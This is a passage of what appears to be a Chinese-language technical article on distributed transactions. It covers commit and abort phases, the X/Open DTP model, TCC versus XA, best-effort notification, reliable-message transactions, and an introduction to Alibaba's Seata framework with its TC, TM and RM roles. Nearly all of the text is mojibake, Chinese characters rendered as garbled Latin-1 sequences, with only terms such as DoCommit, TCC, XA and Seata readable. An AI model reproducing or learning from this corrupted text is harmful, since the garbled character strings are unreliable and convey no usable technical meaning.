è¯·æ±‚ä¹‹åï¼ˆæˆ–è¶…æ—¶ä¹‹åï¼Œä»æœªæ”¶åˆ°åè°ƒè€…çš„è¯·æ±‚ï¼‰ï¼Œæ‰§è¡Œäº‹åŠ¡çš„ä¸­æ–­ DoCommit é˜¶æ®µ è¯¥é˜¶æ®µè¿›è¡ŒçœŸæ­£çš„äº‹åŠ¡æäº¤ï¼Œä¹Ÿå¯ä»¥åˆ†ä¸ºä»¥ä¸‹ä¸¤ç§æƒ…å†µï¼š æ‰§è¡Œæäº¤ï¼š å‘é€æäº¤è¯·æ±‚ï¼šåè°ƒæ¥æ”¶åˆ°å‚ä¸è€…å‘é€çš„ ACK å“åº”ï¼Œé‚£ä¹ˆå®ƒå°†ä»é¢„æäº¤çŠ¶æ€è¿›å…¥åˆ°æäº¤çŠ¶æ€ï¼Œå¹¶å‘æ‰€æœ‰å‚ä¸è€…å‘é€ DoCommit è¯·æ±‚ äº‹åŠ¡æäº¤ï¼šå‚ä¸è€…æ¥æ”¶åˆ° DoCommit è¯·æ±‚ä¹‹åï¼Œæ‰§è¡Œæ­£å¼çš„äº‹åŠ¡æäº¤ï¼Œå¹¶åœ¨å®Œæˆäº‹åŠ¡æäº¤ä¹‹åé‡Šæ”¾æ‰€æœ‰äº‹åŠ¡èµ„æº å“åº”åé¦ˆï¼šäº‹åŠ¡æäº¤å®Œä¹‹åï¼Œå‘åè°ƒè€…å‘é€ ACK å“åº” å®Œæˆäº‹åŠ¡ï¼šåè°ƒè€…æ¥æ”¶åˆ°æ‰€æœ‰å‚ä¸è€…çš„ ACK å“åº”ä¹‹åï¼Œå®Œæˆäº‹åŠ¡ ä¸­æ–­äº‹åŠ¡ å‘é€ä¸­æ–­è¯·æ±‚ï¼šåè°ƒè€…å‘æ‰€æœ‰å‚ä¸è€…å‘é€ Abort è¯·æ±‚ äº‹åŠ¡å›æ»šï¼šå‚ä¸è€…æ¥æ”¶åˆ° Abort è¯·æ±‚ä¹‹åï¼Œåˆ©ç”¨å…¶åœ¨é˜¶æ®µäºŒè®°å½•çš„ Undo ä¿¡æ¯æ¥æ‰§è¡Œäº‹åŠ¡çš„å›æ»šæ“ä½œï¼Œå¹¶åœ¨å®Œæˆå›æ»šä¹‹åé‡Šæ”¾æ‰€æœ‰çš„äº‹åŠ¡èµ„æº åé¦ˆç»“æœï¼šå‚ä¸è€…å®Œæˆäº‹åŠ¡å›æ»šä¹‹åï¼Œå‘åè°ƒè€…å‘é€ ACK æ¶ˆæ¯ ä¸­æ–­äº‹åŠ¡ï¼šåè°ƒè€…æ¥æ”¶åˆ°å‚ä¸è€…åé¦ˆçš„ ACK æ¶ˆæ¯ä¹‹åï¼Œæ‰§è¡Œäº‹åŠ¡çš„ä¸­æ–­ è¿™é‡Œåè°ƒè€…å¦‚æœæ²¡æœ‰æ¥æ”¶åˆ°å‚ä¸è€…å‘é€çš„ ACK å“åº”ï¼ˆå¯èƒ½æ˜¯æ¥å—è€…å‘é€çš„ä¸æ˜¯ ACK å“åº”ï¼Œä¹Ÿå¯èƒ½å“åº”è¶…æ—¶ï¼‰ï¼Œé‚£ä¹ˆå°±ä¼šæ‰§è¡Œä¸­æ–­äº‹åŠ¡ã€‚ åˆ†å¸ƒå¼äº‹åŠ¡è§£å†³æ–¹æ¡ˆå…¨å±€äº‹åŠ¡ï¼ˆDTP æ¨¡å‹ï¼‰å…¨å±€äº‹åŠ¡æ˜¯åŸºäº DTP æ¨¡å‹å®ç°çš„ï¼ŒDTP æ˜¯ç”± X/Open ç»„ç»‡æå‡ºçš„ä¸€ç§åˆ†å¸ƒå¼äº‹åŠ¡æ¨¡å‹ â€”â€”X/Open Distributed Transaction Processing Reference Modelã€‚å®ƒè§„å®šäº†è¦å®ç°åˆ†å¸ƒå¼äº‹åŠ¡ï¼Œéœ€è¦ä¸‰ç§è§’è‰²ï¼š AP: Application åº”ç”¨ç³»ç»Ÿ (å¾®æœåŠ¡) TM: Transaction Manager äº‹åŠ¡ç®¡ç†å™¨ (å…¨å±€äº‹åŠ¡ç®¡ç†) RM: Resource Manager èµ„æºç®¡ç†å™¨ (æ•°æ®åº“) æ•´ä¸ªäº‹åŠ¡åˆ†æˆä¸¤ä¸ªé˜¶æ®µï¼š é˜¶æ®µä¸€ï¼šè¡¨å†³é˜¶æ®µï¼Œæ‰€æœ‰å‚ä¸è€…éƒ½å°†æœ¬äº‹åŠ¡æ‰§è¡Œé¢„æäº¤ï¼Œå¹¶å°†èƒ½å¦æˆåŠŸçš„ä¿¡æ¯åé¦ˆå‘ç»™åè°ƒè€… é˜¶æ®µäºŒï¼šæ‰§è¡Œé˜¶æ®µï¼Œåè°ƒè€…æ ¹æ®æ‰€æœ‰å‚ä¸è€…çš„åé¦ˆï¼Œé€šçŸ¥æ‰€æœ‰å‚ä¸è€…ï¼Œæ­¥è°ƒä¸€è‡´åœ°æ‰§è¡Œæäº¤æˆ–è€…å›æ»š ä¼˜ç‚¹ï¼š æé«˜äº†æ•°æ®ä¸€è‡´æ€§çš„æ¦‚ç‡ï¼Œå®ç°æˆæœ¬è¾ƒä½ ç¼ºç‚¹ï¼š å•ç‚¹é—®é¢˜ï¼šäº‹åŠ¡åè°ƒè€…å®•æœº åŒæ­¥é˜»å¡ï¼šå»¶è¿Ÿäº†æäº¤æ—¶é—´ï¼ŒåŠ é•¿äº†èµ„æºé˜»å¡æ—¶é—´ æ•°æ®ä¸ä¸€è‡´ï¼šåœ¨æäº¤çš„ç¬¬äºŒé˜¶æ®µï¼Œä¾ç„¶å­˜åœ¨ Commit ç»“æœæœªçŸ¥çš„æƒ…å†µï¼Œæœ‰å¯èƒ½å¯¼è‡´æ•°æ®ä¸ä¸€è‡´ TCCï¼ˆä¸¤é˜¶æ®µå‹ã€è¡¥å¿å‹ï¼‰TCC å³ä¸º Try Confirm Cancelï¼Œå®ƒå±äºè¡¥å¿å‹åˆ†å¸ƒå¼äº‹åŠ¡ã€‚TCC å®ç°åˆ†å¸ƒå¼äº‹åŠ¡ä¸€å…±æœ‰ä¸‰ä¸ªæ­¥éª¤ï¼š Tryï¼ˆå°è¯•å¾…æ‰§è¡Œçš„ä¸šåŠ¡ï¼‰ï¼šè¿™ä¸ªè¿‡ç¨‹å¹¶æœªæ‰§è¡Œä¸šåŠ¡ï¼Œåªæ˜¯å®Œæˆæ‰€æœ‰ä¸šåŠ¡çš„ä¸€è‡´æ€§æ£€æŸ¥ï¼Œå¹¶é¢„ç•™å¥½æ‰§è¡Œæ‰€éœ€çš„å…¨éƒ¨èµ„æº Confirmï¼ˆç¡®è®¤æ‰§è¡Œä¸šåŠ¡ï¼‰ï¼šç¡®è®¤æ‰§è¡Œä¸šåŠ¡æ“ä½œï¼Œä¸åšä»»ä½•ä¸šåŠ¡æ£€æŸ¥ï¼Œåªä½¿ç”¨ Try é˜¶æ®µé¢„ç•™çš„ä¸šåŠ¡èµ„æºã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œé‡‡ç”¨ TCC åˆ™è®¤ä¸º Confirm é˜¶æ®µæ˜¯ä¸ä¼šå‡ºé”™çš„ã€‚å³åªè¦ Try æˆåŠŸï¼ŒConfirm å°±ä¸€å®šæˆåŠŸã€‚è‹¥ Confirm é˜¶æ®µçœŸçš„å‡ºé”™äº†ï¼Œéœ€å¼•å…¥é‡è¯•æœºåˆ¶æˆ–äººå·¥å¤„ç† Cancelï¼ˆå–æ¶ˆå¾…æ‰§è¡Œçš„ä¸šåŠ¡ï¼‰ï¼šå–æ¶ˆ Try é˜¶æ®µé¢„ç•™çš„ä¸šåŠ¡èµ„æºã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œé‡‡ç”¨ TCC åˆ™è®¤ä¸º Cancel é˜¶æ®µä¹Ÿæ˜¯ä¸€å®šæˆåŠŸçš„ã€‚è‹¥ Cancel é˜¶æ®µçœŸçš„å‡ºé”™äº†ï¼Œéœ€å¼•å…¥é‡è¯•æœºåˆ¶æˆ–äººå·¥å¤„ç† TCC ä¸¤é˜¶æ®µæäº¤ä¸ XA ä¸¤é˜¶æ®µæäº¤çš„åŒºåˆ«ï¼š XA æ˜¯èµ„æºå±‚é¢çš„åˆ†å¸ƒå¼äº‹åŠ¡ï¼Œå¼ºä¸€è‡´æ€§ï¼Œåœ¨ä¸¤é˜¶æ®µæäº¤çš„æ•´ä¸ªè¿‡ç¨‹ä¸­ï¼Œä¸€ç›´ä¼šæŒæœ‰èµ„æºçš„é” TCC æ˜¯ä¸šåŠ¡å±‚é¢çš„åˆ†å¸ƒå¼äº‹åŠ¡ï¼Œæœ€ç»ˆä¸€è‡´æ€§ï¼Œä¸ä¼šä¸€ç›´æŒæœ‰èµ„æºçš„é” TCC äº‹åŠ¡çš„ä¼˜ç¼ºç‚¹ï¼š ä¼˜ç‚¹ï¼šæŠŠæ•°æ®åº“å±‚çš„äºŒé˜¶æ®µæäº¤ä¸Šæåˆ°äº†åº”ç”¨å±‚æ¥å®ç°ï¼Œè§„é¿äº†æ•°æ®åº“å±‚çš„ 2PC æ€§èƒ½ä½ä¸‹çš„é—®é¢˜ ç¼ºç‚¹ï¼šTCC çš„ Tryã€Confirm å’Œ Cancel æ“ä½œåŠŸèƒ½éœ€ä¸šåŠ¡æä¾›ï¼Œå¼€å‘æˆæœ¬é«˜ æœ€å¤§åŠªåŠ›é€šçŸ¥ï¼ˆå®šæœŸæ ¡å¯¹ï¼‰æœ€å¤§åŠªåŠ›é€šçŸ¥ä¹Ÿè¢«ç§°ä¸ºå®šæœŸæ ¡å¯¹ï¼Œå…¶å®æ˜¯å¯¹ç¬¬äºŒç§è§£å†³æ–¹æ¡ˆçš„è¿›ä¸€æ­¥ä¼˜åŒ–ã€‚å®ƒå¼•å…¥äº†æœ¬åœ°æ¶ˆæ¯è¡¨æ¥è®°å½•é”™è¯¯æ¶ˆæ¯ï¼Œç„¶ååŠ å…¥å¤±è´¥æ¶ˆæ¯çš„å®šæœŸæ ¡å¯¹åŠŸèƒ½ï¼Œæ¥è¿›ä¸€æ­¥ä¿è¯æ¶ˆæ¯ä¼šè¢«ä¸‹æ¸¸ç³»ç»Ÿæ¶ˆè´¹ã€‚ ç¬¬ä¸€æ­¥ï¼šæ¶ˆæ¯ç”±ç³»ç»Ÿ A æŠ•é€’åˆ°æ¶ˆæ¯ä¸­é—´ä»¶ 1ï¼‰å¤„ç†ä¸šåŠ¡çš„åŒä¸€äº‹åŠ¡ä¸­ï¼Œå‘æœ¬åœ°æ¶ˆæ¯è¡¨ä¸­å†™å…¥ä¸€æ¡è®°å½• 2ï¼‰å‡†å¤‡ä¸“é—¨çš„æ¶ˆæ¯å‘é€è€…ä¸æ–­åœ°å‘é€æœ¬åœ°æ¶ˆæ¯è¡¨ä¸­çš„æ¶ˆæ¯åˆ°æ¶ˆæ¯ä¸­é—´ä»¶ï¼Œå¦‚æœå‘é€å¤±è´¥åˆ™é‡è¯• ç¬¬äºŒæ­¥ï¼šæ¶ˆæ¯ç”±ä¸­é—´ä»¶æŠ•é€’åˆ°ç³»ç»Ÿ B 1ï¼‰æ¶ˆæ¯ä¸­é—´ä»¶æ”¶åˆ°æ¶ˆæ¯åè´Ÿè´£å°†è¯¥æ¶ˆæ¯åŒæ­¥æŠ•é€’ç»™ç›¸åº”çš„ä¸‹æ¸¸ç³»ç»Ÿï¼Œå¹¶è§¦å‘ä¸‹æ¸¸ç³»ç»Ÿçš„ä»»åŠ¡æ‰§è¡Œ 2ï¼‰å½“ä¸‹æ¸¸ç³»ç»Ÿå¤„ç†æˆåŠŸåï¼Œå‘æ¶ˆæ¯ä¸­é—´ä»¶åé¦ˆç¡®è®¤åº”ç­”ï¼Œæ¶ˆæ¯ä¸­é—´ä»¶ä¾¿å¯ä»¥å°†è¯¥æ¡æ¶ˆæ¯åˆ é™¤ï¼Œä»è€Œè¯¥äº‹åŠ¡å®Œæˆ 3ï¼‰å¯¹äºæŠ•é€’å¤±è´¥çš„æ¶ˆæ¯ï¼Œåˆ©ç”¨é‡è¯•æœºåˆ¶è¿›è¡Œé‡è¯•ï¼Œå¯¹äºé‡è¯•å¤±è´¥çš„ï¼Œå†™å…¥é”™è¯¯æ¶ˆæ¯è¡¨ 4ï¼‰æ¶ˆæ¯ä¸­é—´ä»¶éœ€è¦æä¾›å¤±è´¥æ¶ˆæ¯çš„æŸ¥è¯¢æ¥å£ï¼Œä¸‹æ¸¸ç³»ç»Ÿä¼šå®šæœŸæŸ¥è¯¢å¤±è´¥æ¶ˆæ¯ï¼Œå¹¶å°†å…¶æ¶ˆè´¹ ä¼˜ç¼ºç‚¹ï¼š ä¼˜ç‚¹ï¼š ä¸€ç§éå¸¸ç»å…¸çš„å®ç°ï¼Œå®ç°äº†æœ€ç»ˆä¸€è‡´æ€§ ç¼ºç‚¹ï¼š æ¶ˆæ¯è¡¨ä¼šè€¦åˆåˆ°ä¸šåŠ¡ç³»ç»Ÿä¸­ï¼Œå¦‚æœæ²¡æœ‰å°è£…å¥½çš„è§£å†³æ–¹æ¡ˆï¼Œä¼šæœ‰å¾ˆå¤šæ‚æ´»éœ€è¦å¤„ç†ï¼Œåœ¨ä¸šç•Œå¹¶æ²¡æœ‰æˆç†Ÿçš„æ–¹æ¡ˆæ¥è§£å†³ åŸºäºå¯é æ¶ˆæ¯æœåŠ¡çš„åˆ†å¸ƒå¼äº‹åŠ¡åŸºäºå¯é æ¶ˆæ¯æœåŠ¡çš„æ–¹æ¡ˆæ˜¯é€šè¿‡æ¶ˆæ¯ä¸­é—´ä»¶ä¿è¯ä¸Šã€ä¸‹æ¸¸åº”ç”¨æ•°æ®æ“ä½œçš„ä¸€è‡´æ€§ã€‚å‡è®¾æœ‰ A å’Œ B ä¸¤ä¸ªç³»ç»Ÿï¼Œåˆ†åˆ«å¯ä»¥å¤„ç†ä»»åŠ¡ A å’Œä»»åŠ¡ Bã€‚æ­¤æ—¶å­˜åœ¨ä¸€ä¸ªä¸šåŠ¡æµç¨‹ï¼Œéœ€è¦å°†ä»»åŠ¡ A å’Œä»»åŠ¡ B åœ¨åŒä¸€ä¸ªäº‹åŠ¡ä¸­å¤„ç†ï¼Œæ­¤æ—¶å°±å¯ä»¥ä½¿ç”¨æ¶ˆæ¯ä¸­é—´ä»¶æ¥å®ç°è¿™ç§åˆ†å¸ƒå¼äº‹åŠ¡ã€‚ ç¬¬ä¸€æ­¥ï¼šæ¶ˆæ¯ç”±ç³»ç»Ÿ A æŠ•é€’åˆ°æ¶ˆæ¯ä¸­é—´ä»¶ 1ï¼‰åœ¨ç³»ç»Ÿ A å¤„ç†ä»»åŠ¡ A å‰ï¼Œé¦–å…ˆå‘æ¶ˆæ¯ä¸­é—´ä»¶å‘é€ä¸€æ¡æ¶ˆæ¯ 2ï¼‰æ¶ˆæ¯ä¸­é—´ä»¶æ”¶åˆ°åå°†è¯¥æ¡æ¶ˆæ¯æŒä¹…åŒ–ï¼Œä½†å¹¶ä¸æŠ•é€’ã€‚æŒä¹…åŒ–æˆåŠŸåï¼Œå‘ A å›å¤ä¸€ä¸ªç¡®è®¤åº”ç­” 3ï¼‰ç³»ç»Ÿ A æ”¶åˆ°ç¡®è®¤åº”ç­”åï¼Œåˆ™å¯ä»¥å¼€å§‹å¤„ç†ä»»åŠ¡ A 4ï¼‰ä»»åŠ¡ A å¤„ç†å®Œæˆåï¼Œå‘æ¶ˆæ¯ä¸­é—´ä»¶å‘é€ Commit æˆ–è€… Rollback è¯·æ±‚ã€‚è¯¥è¯·æ±‚å‘é€å®Œæˆåï¼Œå¯¹ç³»ç»Ÿ A è€Œè¨€ï¼Œè¯¥äº‹åŠ¡çš„å¤„ç†è¿‡ç¨‹å°±ç»“æŸäº† 5ï¼‰å¦‚æœæ¶ˆæ¯ä¸­é—´ä»¶æ”¶åˆ° Commitï¼Œåˆ™å‘ B ç³»ç»ŸæŠ•é€’æ¶ˆæ¯ï¼›å¦‚æœæ”¶åˆ° Rollbackï¼Œåˆ™ç›´æ¥ä¸¢å¼ƒæ¶ˆæ¯ã€‚ä½†æ˜¯å¦‚æœæ¶ˆæ¯ä¸­é—´ä»¶æ”¶ä¸åˆ° Commit å’Œ Rollback æŒ‡ä»¤ï¼Œé‚£ä¹ˆå°±è¦ä¾é â€ è¶…æ—¶è¯¢é—®æœºåˆ¶â€ è¶…æ—¶è¯¢é—®æœºåˆ¶ ç³»ç»Ÿ A é™¤äº†å®ç°æ­£å¸¸çš„ä¸šåŠ¡æµç¨‹å¤–ï¼Œè¿˜éœ€æä¾›ä¸€ä¸ªäº‹åŠ¡è¯¢é—®çš„æ¥å£ï¼Œä¾›æ¶ˆæ¯ä¸­é—´ä»¶è°ƒç”¨ã€‚å½“æ¶ˆæ¯ä¸­é—´ä»¶æ”¶åˆ°å‘å¸ƒæ¶ˆæ¯ä¾¿å¼€å§‹è®¡æ—¶ï¼Œå¦‚æœåˆ°äº†è¶…æ—¶æ²¡æ”¶åˆ°ç¡®è®¤æŒ‡ä»¤ï¼Œå°±ä¼šä¸»åŠ¨è°ƒç”¨ç³»ç»Ÿ A æä¾›çš„äº‹åŠ¡è¯¢é—®æ¥å£è¯¢é—®è¯¥ç³»ç»Ÿç›®å‰çš„çŠ¶æ€ã€‚è¯¥æ¥å£ä¼šè¿”å›ä¸‰ç§ç»“æœï¼Œä¸­é—´ä»¶æ ¹æ®ä¸‰ç§ç»“æœåšå‡ºä¸åŒååº”ï¼š æäº¤ï¼šå°†è¯¥æ¶ˆæ¯æŠ•é€’ç»™ç³»ç»Ÿ B å›æ»šï¼šç›´æ¥å°†æ¶ˆæ¯ä¸¢å¼ƒ å¤„ç†ä¸­ï¼šç»§ç»­ç­‰å¾… ç¬¬äºŒæ­¥ï¼šæ¶ˆæ¯ç”±ä¸­é—´ä»¶æŠ•é€’åˆ°ç³»ç»Ÿ B æ¶ˆæ¯ä¸­é—´ä»¶å‘ä¸‹æ¸¸ç³»ç»ŸæŠ•é€’å®Œæ¶ˆæ¯åä¾¿è¿›å…¥é˜»å¡ç­‰å¾…çŠ¶æ€ï¼Œä¸‹æ¸¸ç³»ç»Ÿä¾¿ç«‹å³è¿›è¡Œä»»åŠ¡çš„å¤„ç†ï¼Œä»»åŠ¡å¤„ç†å®Œæˆåä¾¿å‘æ¶ˆæ¯ä¸­é—´ä»¶è¿”å›åº”ç­”ã€‚ å¦‚æœæ¶ˆæ¯ä¸­é—´ä»¶æ”¶åˆ°ç¡®è®¤åº”ç­”åä¾¿è®¤ä¸ºè¯¥äº‹åŠ¡å¤„ç†å®Œæ¯• å¦‚æœæ¶ˆæ¯ä¸­é—´ä»¶åœ¨ç­‰å¾…ç¡®è®¤åº”ç­”è¶…æ—¶ä¹‹åå°±ä¼šé‡æ–°æŠ•é€’ï¼Œç›´åˆ°ä¸‹æ¸¸æ¶ˆè´¹è€…è¿”å›æ¶ˆè´¹æˆåŠŸå“åº”ä¸ºæ­¢ã€‚ä¸€èˆ¬æ¶ˆæ¯ä¸­é—´ä»¶å¯ä»¥è®¾ç½®æ¶ˆæ¯é‡è¯•çš„æ¬¡æ•°å’Œæ—¶é—´é—´éš”ï¼Œå¦‚æœæœ€ç»ˆè¿˜æ˜¯ä¸èƒ½æˆåŠŸæŠ•é€’ï¼Œåˆ™éœ€è¦æ‰‹å·¥å¹²é¢„ã€‚è¿™é‡Œä¹‹æ‰€ä»¥ä½¿ç”¨äººå·¥å¹²é¢„ï¼Œè€Œä¸æ˜¯ä½¿ç”¨è®© ï¼¡ ç³»ç»Ÿå›æ»šï¼Œä¸»è¦æ˜¯è€ƒè™‘åˆ°æ•´ä¸ªç³»ç»Ÿè®¾è®¡çš„å¤æ‚åº¦é—®é¢˜ åŸºäºå¯é æ¶ˆæ¯æœåŠ¡çš„åˆ†å¸ƒå¼äº‹åŠ¡ï¼Œå‰åŠéƒ¨åˆ†ä½¿ç”¨å¼‚æ­¥ï¼Œæ³¨é‡æ€§èƒ½ï¼›ååŠéƒ¨åˆ†ä½¿ç”¨åŒæ­¥ï¼Œæ³¨é‡å¼€å‘æˆæœ¬ã€‚ Seata ä»‹ç»Seata ç®€ä»‹2019 å¹´ 1 æœˆï¼Œé˜¿é‡Œå·´å·´ä¸­é—´ä»¶å›¢é˜Ÿå‘èµ·äº†å¼€æºé¡¹ç›® Fescarï¼ˆFast &amp; Easy Commit And Rollbackï¼‰ï¼Œå…¶æ„¿æ™¯æ˜¯è®©åˆ†å¸ƒå¼äº‹åŠ¡çš„ä½¿ç”¨åƒæœ¬åœ°äº‹åŠ¡çš„ä½¿ç”¨ä¸€æ ·ï¼Œç®€å•å’Œé«˜æ•ˆï¼Œå¹¶é€æ­¥è§£å†³å¼€å‘è€…ä»¬é‡åˆ°çš„åˆ†å¸ƒå¼äº‹åŠ¡æ–¹é¢çš„æ‰€æœ‰éš¾é¢˜ã€‚Fescar å¼€æºåï¼Œèš‚èšé‡‘æœåŠ å…¥ Fescar ç¤¾åŒºå‚ä¸å…±å»ºï¼Œå¹¶åœ¨ Fescar 0.4.0 ç‰ˆæœ¬ä¸­è´¡çŒ®äº† TCC æ¨¡å¼ã€‚ä¸ºäº†æ‰“é€ æ›´ä¸­ç«‹ã€æ›´å¼€æ”¾ã€ç”Ÿæ€æ›´åŠ ä¸°å¯Œçš„åˆ†å¸ƒå¼äº‹åŠ¡å¼€æºç¤¾åŒºï¼Œç»è¿‡ç¤¾åŒºæ ¸å¿ƒæˆå‘˜çš„æŠ•ç¥¨ï¼Œå†³å®šå¯¹ Fescar è¿›è¡Œå“ç‰Œå‡çº§ï¼Œäº 2019 å¹´ 5 æœˆ å¼€å§‹æ›´åä¸º Seataï¼Œæ„ä¸ºï¼šSimple Extensible Autonomous Transaction Architectureï¼Œæ˜¯ä¸€å¥—ä¸€ç«™å¼åˆ†å¸ƒå¼äº‹åŠ¡è§£å†³æ–¹æ¡ˆï¼Œä¸ºç”¨æˆ·æä¾›äº† ATã€TCCã€SAGA å’Œ XA äº‹åŠ¡æ¨¡å¼ã€‚Seata èåˆäº†é˜¿é‡Œå·´å·´å’Œèš‚èšé‡‘æœåœ¨åˆ†å¸ƒå¼äº‹åŠ¡æŠ€æœ¯ä¸Šçš„ç§¯ç´¯ï¼Œå¹¶æ²‰æ·€äº†æ–°é›¶å”®ã€äº‘è®¡ç®—å’Œæ–°é‡‘èç­‰åœºæ™¯ä¸‹ä¸°å¯Œçš„å®è·µç»éªŒï¼Œä½†è¦å®ç°é€‚ç”¨äºæ‰€æœ‰çš„åˆ†å¸ƒå¼äº‹åŠ¡åœºæ™¯çš„æ„¿æ™¯ï¼Œä»æœ‰å¾ˆé•¿çš„è·¯è¦èµ°ã€‚æ›´å¤šä»‹ç»å¯å‚è€ƒï¼šSeata é¡¹ç›®ã€Seata å®˜æ–¹ç¤ºä¾‹ä»£ç ã€Seata å®˜ç½‘ã€Seata å®˜æ–¹ä¸­æ–‡æ–‡æ¡£ Seata æ¼”è¿›å†å² TXCï¼šTaobao Transaction Constructorï¼Œé˜¿é‡Œå·´å·´ä¸­é—´ä»¶å›¢é˜Ÿè‡ª 2014 å¹´èµ·å¯åŠ¨è¯¥é¡¹ç›®ï¼Œä»¥æ»¡è¶³åº”ç”¨ç¨‹åºæ¶æ„ä»å•ä¸€æœåŠ¡å˜ä¸ºå¾®æœåŠ¡æ‰€å¯¼è‡´çš„åˆ†å¸ƒå¼äº‹åŠ¡é—®é¢˜ GTSï¼šGlobal Transaction Serviceï¼Œ2016 å¹´ TXC ä½œä¸ºé˜¿é‡Œä¸­é—´ä»¶çš„äº§å“ï¼Œæ›´åä¸º GTS å‘å¸ƒ FESCARï¼š2019 å¹´å¼€å§‹åŸºäº TXC/GTS å¼€æº FESCAR SEATAï¼š2019 å¹´ 5 æœˆ FESCAR æ›´åä¸º SEATA Seata è®¾è®¡ç†å¿µSeata çš„è®¾è®¡ç›®æ ‡æ˜¯å¯¹ä¸šåŠ¡æ— ä¾µå…¥ï¼Œå› æ­¤ä»ä¸šåŠ¡æ— ä¾µå…¥çš„ 2PC æ–¹æ¡ˆç€æ‰‹ï¼Œåœ¨ä¼ ç»Ÿ 2PC çš„åŸºç¡€ä¸Šæ¼”è¿›ã€‚å®ƒæŠŠä¸€ä¸ªåˆ†å¸ƒå¼äº‹åŠ¡ç†è§£æˆä¸€ä¸ªåŒ…å«äº†è‹¥å¹²åˆ†æ”¯äº‹åŠ¡çš„å…¨å±€äº‹åŠ¡ã€‚å…¨å±€äº‹åŠ¡çš„èŒè´£æ˜¯åè°ƒå…¶ä¸‹ç®¡è¾–çš„åˆ†æ”¯äº‹åŠ¡è¾¾æˆä¸€è‡´ï¼Œè¦ä¹ˆä¸€èµ·æˆåŠŸæäº¤ï¼Œè¦ä¹ˆä¸€èµ·å¤±è´¥å›æ»šã€‚æ­¤å¤–ï¼Œé€šå¸¸åˆ†æ”¯äº‹åŠ¡æœ¬èº«å°±æ˜¯ä¸€ä¸ªå…³ç³»å‹æ•°æ®åº“çš„æœ¬åœ°äº‹åŠ¡ã€‚ Seata çš„ä¸‰å¤§ç»„ä»¶ TCï¼šTransaction Coordinator äº‹åŠ¡åè°ƒå™¨ï¼Œç»´æŠ¤å…¨å±€å’Œåˆ†æ”¯äº‹åŠ¡çš„çŠ¶æ€ï¼Œè´Ÿè´£åè°ƒå¹¶é©±åŠ¨å…¨å±€äº‹åŠ¡çš„æäº¤æˆ–å›æ»š TMï¼šTransaction Manager äº‹åŠ¡ç®¡ç†å™¨ï¼Œæ§åˆ¶å…¨å±€äº‹åŠ¡çš„è¾¹ç•Œï¼Œè´Ÿè´£å¼€å¯ä¸€ä¸ªå…¨å±€äº‹åŠ¡ï¼Œå¹¶æœ€ç»ˆå‘èµ·å…¨å±€æäº¤æˆ–å…¨å±€å›æ»šçš„å†³è®® RMï¼šResource Manager èµ„æºç®¡ç†å™¨ï¼Œç®¡ç†åˆ†æ”¯äº‹åŠ¡å¤„ç†çš„èµ„æºï¼Œå‘ TC æ³¨å†Œåˆ†æ”¯äº‹åŠ¡ï¼Œä¸ŠæŠ¥åˆ†æ”¯äº‹åŠ¡çš„çŠ¶æ€ï¼Œæ¥å— TC çš„å‘½ä»¤æ¥æäº¤æˆ–è€…å›æ»šåˆ†æ”¯äº‹åŠ¡ Seata çš„æ‰§è¡Œæµç¨‹ 1ï¼‰A æœåŠ¡çš„ TM å‘ TC ç”³è¯·å¼€å¯ä¸€ä¸ªå…¨å±€äº‹åŠ¡ï¼ŒTC å°±ä¼šåˆ›å»ºä¸€ä¸ªå…¨å±€äº‹åŠ¡å¹¶è¿”å›ä¸€ä¸ªå”¯ä¸€çš„ XID 2ï¼‰A æœåŠ¡çš„ RM å‘ TC æ³¨å†Œåˆ†æ”¯äº‹åŠ¡ï¼Œå¹¶å°†å…¶çº³å…¥ XID å¯¹åº”å…¨å±€äº‹åŠ¡çš„ç®¡è¾– 3ï¼‰A æœåŠ¡æ‰§è¡Œåˆ†æ”¯äº‹åŠ¡ï¼Œå‘æ•°æ®åº“æ‰§è¡Œæ“ä½œ 4ï¼‰A æœåŠ¡å¼€å§‹è¿œç¨‹è°ƒç”¨ B æœåŠ¡ï¼Œæ­¤æ—¶ XID ä¼šåœ¨å¾®æœåŠ¡çš„è°ƒç”¨é“¾ä¸Šä¼ æ’­ 5ï¼‰B æœåŠ¡çš„ RM å‘ TC æ³¨å†Œåˆ†æ”¯äº‹åŠ¡ï¼Œå¹¶å°†å…¶çº³å…¥ XID å¯¹åº”çš„å…¨å±€äº‹åŠ¡çš„ç®¡è¾– 6ï¼‰B æœåŠ¡æ‰§è¡Œåˆ†æ”¯äº‹åŠ¡ï¼Œå‘æ•°æ®åº“æ‰§è¡Œæ“ä½œ 7ï¼‰å…¨å±€äº‹åŠ¡è°ƒç”¨é“¾å¤„ç†å®Œæ¯•ï¼ŒTM æ ¹æ®æœ‰æ— å¼‚å¸¸å‘ TC å‘èµ·å…¨å±€äº‹åŠ¡çš„æäº¤æˆ–è€…å›æ»š 8ï¼‰TC åè°ƒå…¶ç®¡è¾–ä¹‹ä¸‹çš„æ‰€æœ‰åˆ†æ”¯äº‹åŠ¡ï¼Œå†³å®šæ˜¯å¦å›æ»š Seata å®ç°çš„ 2PC ä¸ä¼ ç»Ÿ 2PC çš„åŒºåˆ« 1ï¼‰æ¶æ„å±‚æ¬¡æ–¹é¢ï¼šä¼ ç»Ÿ 2PC æ–¹æ¡ˆçš„ RM å®é™…ä¸Šæ˜¯åœ¨æ•°æ®åº“å±‚ï¼ŒRM æœ¬è´¨ä¸Šå°±æ˜¯æ•°æ®åº“è‡ªèº«ï¼Œé€šè¿‡ XA åè®®å®ç°ï¼Œè€Œ Seata çš„ RM æ˜¯ä»¥ Jar åŒ…çš„å½¢å¼ä½œä¸ºä¸­é—´ä»¶å±‚éƒ¨ç½²åœ¨åº”ç”¨ç¨‹åºè¿™ä¸€ä¾§çš„ 2ï¼‰ä¸¤é˜¶æ®µæäº¤æ–¹é¢ï¼šä¼ ç»Ÿ 2PC æ— è®ºç¬¬äºŒé˜¶æ®µçš„å†³è®®æ˜¯ Commit è¿˜æ˜¯ Rollbackï¼Œäº‹åŠ¡æ€§èµ„æºçš„é”éƒ½è¦ä¿æŒåˆ° Phase2 å®Œæˆæ‰é‡Šæ”¾ã€‚è€Œ Seata çš„åšæ³•æ˜¯åœ¨ Phase1 å°±å°†æœ¬åœ°äº‹åŠ¡æäº¤ï¼Œè¿™æ ·å°±å¯ä»¥çœå» Phase2 æŒé”çš„æ—¶é—´ï¼Œæ•´ä½“æé«˜äº†æ•ˆç‡ Seata Server å®‰è£…Seata åˆ† TCã€TM å’Œ RM ä¸‰ä¸ªè§’è‰²ï¼ŒTCï¼ˆServer 